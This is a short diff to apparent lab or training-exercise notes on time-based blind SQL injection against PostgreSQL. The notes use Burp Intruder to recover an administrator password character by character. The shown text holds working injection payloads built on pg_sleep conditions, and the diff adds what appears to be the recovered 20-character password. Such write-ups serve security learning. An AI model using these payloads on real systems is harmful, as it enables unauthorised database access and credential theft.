@@ -18,3 +18,6 @@ The password length is 20 character
 4. Test the character at each position. Set concurrent requests to 1 from resource pool before launching the intruder attack 
 '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END from users--
 '; SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+
+
+u910qnz7tii22e6p9m42
